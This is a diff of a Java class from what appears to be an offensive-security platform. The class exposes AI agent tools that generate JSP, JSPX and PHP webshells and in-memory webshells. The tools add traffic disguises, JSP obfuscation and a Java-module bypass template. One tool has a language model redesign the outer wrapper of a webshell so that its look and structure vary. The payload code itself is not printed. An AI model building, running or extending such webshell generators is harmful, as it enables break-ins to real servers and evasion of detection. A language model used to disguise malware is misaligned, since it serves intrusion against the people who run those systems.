@@ -8,7 +8,6 @@ import dev.langchain4j.model.chat.response.ChatResponse;
 import org.leo.ai.agent.AiToolException;
 import org.leo.ai.channel.DelegatingChatModel;
 import org.leo.core.entity.Disguise;
-import org.leo.core.entity.Puppet;
 import org.leo.core.generator.GeneratedArtifact;
 import org.leo.core.generator.GenerationRequest;
 import org.leo.core.runtime.PuppetRuntime;
@@ -16,20 +15,28 @@ import org.leo.jmg.ShellGeneratorConfig;
 import org.leo.jmg.ServletNamespace;
 import org.leo.jmg.TargetJavaVersion;
 import org.leo.jmg.catalog.GeneratorCatalog;
+import org.leo.jmg.generation.CoreArtifact;
+import org.leo.jmg.generation.CoreArtifactGenerationCommand;
+import org.leo.jmg.generation.CoreArtifactGenerationService;
 import org.leo.jmg.generation.MemoryShellGenerationCommand;
 import org.leo.jmg.generation.ShellGenerationOutcome;
 import org.leo.jmg.generation.ShellGenerationService;
-import org.leo.jmg.generation.WebShellGenerationCommand;
+import org.leo.jmg.generation.WebShellWrapperContract;
+import org.leo.jmg.generation.WebShellWrapperResult;
+import org.leo.jmg.generation.WebShellWrapperService;
 import org.leo.jmg.mem.packer.PackerRegistry;
 import org.leo.jmg.mem.packer.PackerResources;
+import org.leo.jmg.mem.packer.jsp.JspLoaderTemplateValidator;
 import org.leo.jmg.mem.packer.jsp.JspObfuscationStepCatalog;
-import org.leo.service.PuppetService;
 import org.leo.service.disguise.DisguiseService;
 import org.leo.service.generator.ScriptGeneratorService;
+import org.leo.service.shell.CoreArtifactStore;
 import org.leo.service.shell.ShellResultStore;
+import org.leo.service.shell.WebShellWrapperTemplateStore;
 import org.springframework.stereotype.Component;
 
 import java.util.Arrays;
+import java.util.Collections;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Locale;
@@ -49,10 +56,16 @@ import java.util.Map;
  * </ol>
  */
 @Component
+@org.leo.ai.agent.AiToolPolicy(kind = org.leo.ai.agent.AiToolKind.ARTIFACT,
+        operation = org.leo.ai.agent.AiToolOperation.WRITE)
 public class ShellGeneratorTools {
 
     private static final ShellGenerationService SHELL_GENERATION_SERVICE =
             new ShellGenerationService();
+    private static final CoreArtifactGenerationService CORE_ARTIFACT_GENERATION_SERVICE =
+            new CoreArtifactGenerationService();
+    private static final WebShellWrapperService WEB_SHELL_WRAPPER_SERVICE =
+            new WebShellWrapperService();
 
     private static final String TEMPLATE_SHELL_JSP  = "/memshell-template/shell.jsp.txt";
     private static final String TEMPLATE_SHELL1_JSP = "/memshell-template/shell1.jsp.txt";
@@ -85,22 +98,22 @@ public class ShellGeneratorTools {
     private final DisguiseService disguiseService;
     private final DelegatingChatModel chatModel;
     private final ShellResultStore resultStore;
-    private final PuppetService puppetService;
     private final ScriptGeneratorService scriptGeneratorService;
-    private final PlatformToolAccessService accessService;
+    private final CoreArtifactStore coreArtifactStore;
+    private final WebShellWrapperTemplateStore wrapperTemplateStore;
 
     public ShellGeneratorTools(DisguiseService disguiseService,
                                DelegatingChatModel chatModel,
                                ShellResultStore resultStore,
-                               PuppetService puppetService,
                                ScriptGeneratorService scriptGeneratorService,
-                               PlatformToolAccessService accessService) {
+                               CoreArtifactStore coreArtifactStore,
+                               WebShellWrapperTemplateStore wrapperTemplateStore) {
         this.disguiseService = disguiseService;
         this.chatModel = chatModel;
         this.resultStore = resultStore;
-        this.puppetService = puppetService;
         this.scriptGeneratorService = scriptGeneratorService;
-        this.accessService = accessService;
+        this.coreArtifactStore = coreArtifactStore;
+        this.wrapperTemplateStore = wrapperTemplateStore;
     }
 
     // ── 元数据查询 ──────────────────────────────────────────────────────────────
@@ -108,6 +121,8 @@ public class ShellGeneratorTools {
     @Tool("获取 Shell 生成器元数据：Java 服务器类型、注入器形态、Packer、Servlet 命名空间、JSP 混淆步骤，" +
           "以及 PHP 等运行时生成器支持的 artifactTypes、协议、最低版本、输出模式和运行要求。" +
           "生成 WebShell 或内存马前调用此工具确认合法参数范围，不要凭记忆猜测。")
+    @org.leo.ai.agent.AiToolPolicy(kind = org.leo.ai.agent.AiToolKind.QUERY,
+            operation = org.leo.ai.agent.AiToolOperation.READ_ONLY, parallelizable = true)
     public Map<String, Object> getShellGeneratorMeta() {
         Map<String, Object> data = new LinkedHashMap<>();
         data.put("serverInjectorTypes", GeneratorCatalog.getServerInjectorMap());
@@ -127,46 +142,163 @@ public class ShellGeneratorTools {
         return data;
     }
 
-    @Tool("根据 puppetId 查询该 Puppet 当前使用的通信协议和伪装器配置，" +
-          "返回 runtime、protocol、reqDisguiseId、reqDisguiseName、respDisguiseId、respDisguiseName。" +
-          "生成 WebShell 或内存马前必须调用此工具，确保生成的 shell 与当前傀儡节点通信协议完全匹配，" +
-          "避免因协议或伪装器不匹配导致 shell 无法使用。" +
-          "如果用户未明确指定 puppetId，请先通过 getAllPuppet 工具获取可用节点列表后再调用本工具。")
-    public Map<String, Object> getPuppetShellConfig(String puppetId) throws Exception {
-        if (isBlank(puppetId)) throw new IllegalArgumentException("puppetId 不能为空");
-        Puppet puppet = puppetService.findPuppetById(puppetId.trim());
-        if (puppet == null) throw new IllegalArgumentException("Puppet 不存在: " + puppetId);
-        accessService.requireVisible(puppet);
+    // ── AI WebShell：Core 与 Wrapper 分阶段生成 ─────────────────────────────────
 
+    @Tool("独立生成 Java LeoCore 并存入服务端缓存，返回 coreArtifactId、哈希和非敏感契约元数据；" +
+          "绝不返回 Core 字节码或 Base64。生成 Java WebShell 时，在用户选定请求/响应伪装、协议和兼容参数后先调用此工具。" +
+          "protocol 支持 http/httpchunk；coreClassName 留空自动随机；obfuscationSeed 留空自动随机，指定后可复现生成。")
+    public Map<String, Object> createJavaCoreArtifact(
+            String reqDisguiseId,
+            String respDisguiseId,
+            String protocol,
+            String coreClassName,
+            String targetJavaVersion,
+            String servletNamespace,
+            Long obfuscationSeed) throws Exception {
+        Disguise reqDisguise = requireDisguise(reqDisguiseId, "reqDisguiseId");
+        Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
+        CoreArtifact artifact = CORE_ARTIFACT_GENERATION_SERVICE.generate(
+                CoreArtifactGenerationCommand.builder(reqDisguise, respDisguise)
+                        .protocol(protocol)
+                        .coreClassName(coreClassName)
+                        .targetJavaVersion(targetJavaVersion)
+                        .servletNamespace(servletNamespace)
+                        .obfuscationSeed(obfuscationSeed)
+                        .build());
+        if ("websocket".equals(artifact.getProtocol().getValue())) {
+            throw new IllegalArgumentException("Java WebShell Core 仅支持 http 或 httpchunk");
+        }
+        String artifactId = coreArtifactStore.put(artifact);
         Map<String, Object> result = new LinkedHashMap<>();
-        result.put("success",       true);
-        result.put("puppetId",      puppet.getPuppetId());
-        result.put("puppetName",    puppet.getPuppetName());
-        result.put("runtime",       isBlank(puppet.getType())
-                ? "java" : puppet.getType().trim().toLowerCase(Locale.ROOT));
-        result.put("protocol",      toGeneratorProtocol(puppet.getProtocol()));
-        result.put("reqDisguiseId", puppet.getReqDisguiseId());
-        result.put("respDisguiseId", puppet.getRespDisguiseId());
+        result.put("success", true);
+        result.put("coreArtifactId", artifactId);
+        result.put("coreClassName", artifact.getCoreClassName());
+        result.put("coreSha256", artifact.getSha256());
+        result.put("bytecodeSize", artifact.getBytecodeSize());
+        result.put("protocol", artifact.getProtocol().getValue());
+        result.put("targetJavaVersion", artifact.getTargetJavaVersion().getValue());
+        result.put("servletNamespace", artifact.getServletNamespace().getValue());
+        result.put("obfuscationSeed", Long.toString(artifact.getObfuscationSeed()));
+        result.put("entrypoint", "equals(java.io.ByteArrayOutputStream)");
+        result.put("tip", "Core 仅保存在服务端（30 分钟有效）。下一步调用 designWebShellWrapper。不要索取或转述 Core Payload。");
+        return result;
+    }
 
-        // 补充伪装器名称，方便 AI 理解上下文
-        if (!isBlank(puppet.getReqDisguiseId())) {
-            Disguise req = disguiseService.getDisguiseById(puppet.getReqDisguiseId());
-            result.put("reqDisguiseName", req != null ? req.getDisguiseName() : "unknown");
-        }
-        if (!isBlank(puppet.getRespDisguiseId())) {
-            Disguise resp = disguiseService.getDisguiseById(puppet.getRespDisguiseId());
-            result.put("respDisguiseName", resp != null ? resp.getDisguiseName() : "unknown");
-        }
+    @Tool("获取 AI WebShell Wrapper 契约和不含 Core Payload 的基线模板。" +
+          "shellType 为 JSP/JSPX，protocol 为 http/httpchunk。" +
+          "模板必须保留五个有序阶段占位符，平台会在最终组装时注入受控核心代码。")
+    @org.leo.ai.agent.AiToolPolicy(kind = org.leo.ai.agent.AiToolKind.QUERY,
+            operation = org.leo.ai.agent.AiToolOperation.READ_ONLY, parallelizable = true)
+    public Map<String, Object> getWebShellWrapperContract(String shellType, String protocol) {
+        WebShellWrapperContract contract = WEB_SHELL_WRAPPER_SERVICE.getContract(shellType, protocol);
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put("artifactType", contract.getArtifactType());
+        result.put("protocol", contract.getProtocol().getValue());
+        result.put("requiredPhases", contract.getRequiredPhases());
+        result.put("rules", contract.getRules());
+        result.put("baselineTemplate", contract.getBaselineTemplate());
+        return result;
+    }
 
-        result.put("tip", "请根据 runtime 选择生成工具：php 使用 generatePhpWebShell，" +
-                "java 使用 generateWebShell 或 generateMemoryShell；原样传入 protocol、reqDisguiseId、respDisguiseId。");
+    @Tool("调用 LLM 为指定 coreArtifactId 设计 JSP/JSPX 外层 Wrapper。" +
+          "AI 只修改无 Payload 的模板结构，不能展开五个阶段占位符；模板通过契约校验后只返回 wrapperTemplateId，" +
+          "不会把 Core 或最终代码放入模型上下文。shellType 必须为 JSP/JSPX，requirements 描述业务外观或结构变化目标。")
+    public Map<String, Object> designWebShellWrapper(
+            String coreArtifactId,
+            String shellType,
+            String requirements) throws Exception {
+        CoreArtifact artifact = requireCoreArtifact(coreArtifactId);
+        WebShellWrapperContract contract = WEB_SHELL_WRAPPER_SERVICE.getContract(
+                shellType, artifact.getProtocol().getValue());
+        String template = null;
+        String lastError = null;
+        int maxAttempts = 3;
+        for (int attempt = 1; attempt <= maxAttempts; attempt++) {
+            ChatRequest request = ChatRequest.builder()
+                    .messages(Arrays.asList(
+                            SystemMessage.from(buildWrapperSystemGuide(contract)),
+                            UserMessage.from(buildWrapperPrompt(contract, requirements, lastError))))
+                    .build();
+            ChatResponse response = chatModel.chat(request);
+            String raw = response.aiMessage().text();
+            template = stripCodeFences(raw == null ? "" : raw.trim());
+            try {
+                contract.validate(template);
+                break;
+            } catch (IllegalArgumentException e) {
+                lastError = e.getMessage();
+                if (attempt == maxAttempts) {
+                    throw AiToolException.modelCorrectable(
+                            "GENERATED_CONTENT_INVALID",
+                            "经过 " + maxAttempts + " 次尝试仍未生成合法 Wrapper：" + lastError,
+                            "调整 requirements 后重新设计；不要绕过 Wrapper 契约校验。");
+                }
+            }
+        }
+        String templateId = wrapperTemplateStore.put(
+                template, contract.getArtifactType(), contract.getProtocol().getValue());
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put("success", true);
+        result.put("wrapperTemplateId", templateId);
+        result.put("artifactType", contract.getArtifactType());
+        result.put("protocol", contract.getProtocol().getValue());
+        result.put("templateLength", template.length());
+        result.put("summary", "Wrapper 已通过阶段占位符、结构和禁止操作校验；模板在服务端保存 30 分钟。");
+        return result;
+    }
+
+    @Tool("将服务端 CoreArtifact 与已验证 Wrapper 模板最终组装为 Java WebShell，并返回 resultId。" +
+          "obfuscate 必须明确传 true/false；false 表示空步骤不混淆，true 且未指定步骤时使用平台默认混淆，" +
+          "true 且指定 jspObfuscationSteps 时按合法步骤执行。组装前会再次验证模板、协议和格式一致性。")
+    public Map<String, Object> assembleWebShellWrapper(
+            String coreArtifactId,
+            String wrapperTemplateId,
+            Boolean obfuscate,
+            List<String> jspObfuscationSteps,
+            Integer respCode) throws Exception {
+        if (obfuscate == null) {
+            throw new IllegalArgumentException("obfuscate 必须明确为 true 或 false");
+        }
+        CoreArtifact artifact = requireCoreArtifact(coreArtifactId);
+        WebShellWrapperTemplateStore.TemplateEntry template =
+                wrapperTemplateStore.get(requireNonBlank(wrapperTemplateId, "wrapperTemplateId 不能为空"));
+        if (template == null) {
+            throw new IllegalArgumentException("Wrapper 模板不存在或已过期: " + wrapperTemplateId);
+        }
+        if (!artifact.getProtocol().getValue().equals(template.getProtocol())) {
+            throw new IllegalArgumentException("Core 与 Wrapper 协议不一致");
+        }
+        List<String> effectiveSteps;
+        if (!obfuscate.booleanValue()) {
+            effectiveSteps = Collections.emptyList();
+        } else if (jspObfuscationSteps == null || jspObfuscationSteps.isEmpty()) {
+            effectiveSteps = null;
+        } else {
+            effectiveSteps = jspObfuscationSteps;
+        }
+        WebShellWrapperResult assembled = WEB_SHELL_WRAPPER_SERVICE.assemble(
+                artifact,
+                template.getTemplate(),
+                template.getArtifactType(),
+                respCode,
+                effectiveSteps);
+        Map<String, Object> meta = new LinkedHashMap<>(assembled.getMetadata());
+        meta.put("obfuscated", obfuscate);
+        String resultId = resultStore.put(assembled.getContent(), meta);
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put("success", true);
+        result.put("resultId", resultId);
+        result.put("fetchUrl", "/platform/shell-generator/result/" + resultId);
+        result.put("meta", meta);
+        result.put("tip", "完整代码已缓存（30 分钟有效）。请原样嵌入：[[shell-result:"
+                + resultId + ":取回 WebShell 代码]]");
         return result;
     }
 
     // ── PHP WebShell 生成 ─────────────────────────────────────────────────────
 
     @Tool("生成 PHP WebShell，并将完整代码存入缓存后返回 resultId。" +
-          "调用前必须先用 getPuppetShellConfig 确认目标 runtime=php、protocol=http，并原样传入伪装器 ID。" +
+          "这是独立制品生成，不得读取或沿用任何已有 Puppet 配置；调用前应根据用户本次需求确定请求/响应伪装器。" +
           "outputMode 从 getShellGeneratorMeta 的 runtimeGenerators.php.outputModes 中选择：" +
           "compact 为默认精简源码，packed 需要 zlib/base64_decode/gzinflate，portable 为便于兼容排障的展开源码。" +
           "headerName 与 headerValue 必须同时设置或同时留空；respCode 默认 200；seed 留空时自动随机。" +
@@ -188,7 +320,7 @@ public class ShellGeneratorTools {
             throw AiToolException.modelCorrectable(
                     "UNSUPPORTED_CAPABILITY",
                     "PHP WebShell 当前仅支持 http 协议，当前值: " + protocol,
-                    "先调用 getPuppetShellConfig；仅在目标 protocol=http 时生成 PHP WebShell。");
+                    "调用 getShellGeneratorMeta 确认生成能力；PHP WebShell 仅可选择 http。");
         }
         if (isBlank(headerName) != isBlank(headerValue)) {
             throw AiToolException.modelCorrectable(
@@ -261,9 +393,9 @@ public class ShellGeneratorTools {
             mutated = stripCodeFences(raw.trim());
 
             try {
-                validateMutatedTemplate(mutated);
+                JspLoaderTemplateValidator.validate(mutated);
                 break; // 验证通过，退出重试
-            } catch (AiToolException e) {
+            } catch (IllegalArgumentException e) {
                 lastError = e.getMessage();
                 if (attempt == maxAttempts) {
                     throw AiToolException.modelCorrectable(
@@ -284,74 +416,19 @@ public class ShellGeneratorTools {
         return result;
     }
 
-    // ── WebShell 生成 ───────────────────────────────────────────────────────────
-
-    @Tool("生成 JSP 或 JSPX 格式的 WebShell，生成结果存入缓存并返回 resultId。" +
-          "【重要】调用本工具前必须先调用 getPuppetShellConfig 获取目标傀儡节点的 protocol、reqDisguiseId、respDisguiseId，" +
-          "将这三个值直接传入本工具，确保生成的 shell 与目标节点通信协议完全匹配，避免 shell 无法连接。" +
-          "前端通过 GET /platform/shell-generator/result/{resultId} 取回完整代码。" +
-          "reqDisguiseId / respDisguiseId：请求/响应伪装器 ID，必填，从 getPuppetShellConfig 获取。" +
-          "shellType：JSP 或 JSPX，必填。" +
-          "coreClassName：核心类名，留空自动生成。" +
-          "protocol：http / httpchunk，从 getPuppetShellConfig 获取，默认 http。" +
-          "targetJavaVersion：目标运行时版本，可选 auto / 6 / 7 / 8 / 9+ / 17+，默认 auto。" +
-          "servletNamespace：Servlet API 命名空间，可选 auto / javax / jakarta，默认 auto（当前解析为 javax）。" +
-          "respCode：响应状态码，默认 200。" +
-          "jspObfuscationSteps：混淆步骤 ID 有序列表，null 使用默认策略，空列表不混淆。")
-    public Map<String, Object> generateWebShell(
-            String reqDisguiseId,
-            String respDisguiseId,
-            String shellType,
-            String coreClassName,
-            String protocol,
-            String targetJavaVersion,
-            String servletNamespace,
-            Integer respCode,
-            List<String> jspObfuscationSteps) throws Exception {
-        Disguise reqDisguise  = requireDisguise(reqDisguiseId,  "reqDisguiseId");
-        Disguise respDisguise = requireDisguise(respDisguiseId, "respDisguiseId");
-
-        WebShellGenerationCommand command =
-                WebShellGenerationCommand.builder(
-                                reqDisguise, respDisguise, shellType)
-                        .coreClassName(coreClassName)
-                        .protocol(protocol)
-                        .targetJavaVersion(targetJavaVersion)
-                        .servletNamespace(servletNamespace)
-                        .responseCode(respCode)
-                        .obfuscationSteps(jspObfuscationSteps)
-                        .build();
-        ShellGenerationOutcome outcome =
-                SHELL_GENERATION_SERVICE.generateWebShell(command);
-        String shell = outcome.getContent();
-        Map<String, Object> meta =
-                new LinkedHashMap<String, Object>(outcome.getMetadata());
-
-        String resultId = resultStore.put(shell, meta);
-
-        Map<String, Object> result = new LinkedHashMap<>();
-        result.put("success",   true);
-        result.put("resultId",  resultId);
-        result.put("fetchUrl",  "/platform/shell-generator/result/" + resultId);
-        result.put("meta",      meta);
-        result.put("tip",       "完整代码已缓存（30 分钟有效）。" +
-                "请在回复正文中嵌入以下按钮语法，让用户可以直接在对话中取回代码：" +
-                "[[shell-result:" + resultId + ":取回 WebShell 代码]]");
-        return result;
-    }
-
     // ── 内存马生成 ──────────────────────────────────────────────────────────────
 
     @Tool("生成内存马并将完整代码存入缓存，返回 resultId 供前端取回。" +
-          "【重要】调用本工具前必须先调用 getPuppetShellConfig 获取目标傀儡节点的 protocol、reqDisguiseId、respDisguiseId，" +
-          "将这三个值直接传入本工具，确保生成的内存马与目标节点通信协议完全匹配，避免内存马无法连接。" +
+          "这是独立制品生成，与已有 Puppet 无关；除非用户明确要求匹配某个 Puppet，否则禁止查询或沿用 Puppet 配置。" +
+          "如果用户尚未选择传输协议、请求/响应伪装器、目标容器、注入器、Packer 或是否混淆，" +
+          "先调用 getShellGeneratorMeta 和 getDisguises 获取候选项，再调用 request_user_input 询问用户，收到回答前不要调用本工具。" +
           "前端通过 GET /platform/shell-generator/result/{resultId} 取回完整代码，勿让 LLM 转述完整代码。" +
-          "reqDisguiseId / respDisguiseId：请求/响应伪装器 ID，必填，从 getPuppetShellConfig 获取。" +
+          "reqDisguiseId / respDisguiseId：用户为本次生成选择的请求/响应伪装器 ID，必填。" +
           "headerName / headerValue：http 模式下为必填触发 Header；websocket 模式不使用 Header 门禁。" +
           "serverType：目标应用服务器类型，必填，可通过 getShellGeneratorMeta 获取。" +
           "shellType：注入器形态，必填，可通过 getShellGeneratorMeta 获取。" +
           "packerType：打包器类型，必填，可通过 getShellGeneratorMeta 获取。" +
-          "protocol：http / httpchunk / websocket，从 getPuppetShellConfig 获取，默认 http；" +
+          "protocol：http / httpchunk / websocket，由用户选择；" +
           "httpchunk 下 shellType 使用协议元数据公开的普通形态名，生成器会自动选择 Chunk 模板。" +
           "targetJavaVersion：目标运行时版本，可选 auto / 6 / 7 / 8 / 9+ / 17+，默认 auto；" +
           "servletNamespace：Servlet API 命名空间，可选 auto / javax / jakarta，默认 auto（当前解析为 javax）；" +
@@ -433,7 +510,8 @@ public class ShellGeneratorTools {
             boolean bypass = Boolean.TRUE.equals(byPassJavaModule);
             return PackerResources.loadTemplate(bypass ? TEMPLATE_SHELL2_JSP : TEMPLATE_SHELL1_JSP);
         }
-        return PackerResources.loadTemplate(TEMPLATE_SHELL1_JSP);
+        throw new IllegalArgumentException(
+                "AI JSP 模板变异仅支持 ClassLoaderJSP 或 DefineClassJSP，当前值: " + packerType);
     }
 
     private String buildMutationPrompt(String baseTemplate, String mutationHint, String lastError) {
@@ -457,26 +535,44 @@ public class ShellGeneratorTools {
         return sb.toString();
     }
 
-    private void validateMutatedTemplate(String template) {
-        if (template == null || template.isBlank()) {
-            throw invalidGeneratedTemplate(
-                    "LLM 返回了空模板。");
+    private String buildWrapperSystemGuide(WebShellWrapperContract contract) {
+        StringBuilder guide = new StringBuilder();
+        guide.append("你只负责设计 WebShell 外层模板，真实 Core Payload 永远由平台注入。\n");
+        guide.append("严禁展开、改名、复制或删除阶段占位符。\n");
+        guide.append("必须保留以下顺序：").append(contract.getRequiredPhases()).append("\n");
+        for (String rule : contract.getRules()) {
+            guide.append("- ").append(rule).append("\n");
         }
-        if (!template.contains("{{base64Str}}")) {
-            throw invalidGeneratedTemplate(
-                    "LLM 生成的模板缺少 {{base64Str}} 占位符。");
-        }
-        if (!template.contains("<%")) {
-            throw invalidGeneratedTemplate(
-                    "LLM 生成的模板不包含 JSP scriptlet 标记。");
-        }
+        return guide.toString();
     }
 
-    private AiToolException invalidGeneratedTemplate(String message) {
-        return AiToolException.modelCorrectable(
-                "GENERATED_CONTENT_INVALID",
-                message,
-                "调整 mutationHint 后重新调用模板变异工具；不要直接使用无效模板。");
+    private String buildWrapperPrompt(WebShellWrapperContract contract,
+                                      String requirements,
+                                      String lastError) {
+        StringBuilder prompt = new StringBuilder();
+        prompt.append("请基于以下 ").append(contract.getArtifactType())
+                .append(" 基线模板设计结构变体。协议为 ")
+                .append(contract.getProtocol().getValue()).append("。\n\n");
+        if (!isBlank(requirements)) {
+            prompt.append("用户要求：").append(requirements.trim()).append("\n\n");
+        }
+        if (!isBlank(lastError)) {
+            prompt.append("上一次模板校验失败：").append(lastError.trim())
+                    .append("\n请修正后重新输出。\n\n");
+        }
+        prompt.append("基线模板：\n```\n")
+                .append(contract.getBaselineTemplate())
+                .append("\n```\n\n只输出完整模板源码，不要输出解释或 Markdown 标记。");
+        return prompt.toString();
+    }
+
+    private CoreArtifact requireCoreArtifact(String coreArtifactId) {
+        String id = requireNonBlank(coreArtifactId, "coreArtifactId 不能为空");
+        CoreArtifact artifact = coreArtifactStore.get(id);
+        if (artifact == null) {
+            throw new IllegalArgumentException("CoreArtifact 不存在或已过期: " + id);
+        }
+        return artifact;
     }
 
     private String stripCodeFences(String text) {
@@ -502,14 +598,6 @@ public class ShellGeneratorTools {
 
     private boolean isBlank(String value) {
         return value == null || value.isBlank();
-    }
-
-    private static String toGeneratorProtocol(String puppetProtocol) {
-        if (puppetProtocol == null || puppetProtocol.isBlank()) {
-            return "http";
-        }
-        String normalized = puppetProtocol.trim().toLowerCase(Locale.ROOT);
-        return "httpchunked".equals(normalized) ? "httpchunk" : normalized;
     }
 
     private List<String> targetJavaVersions() {
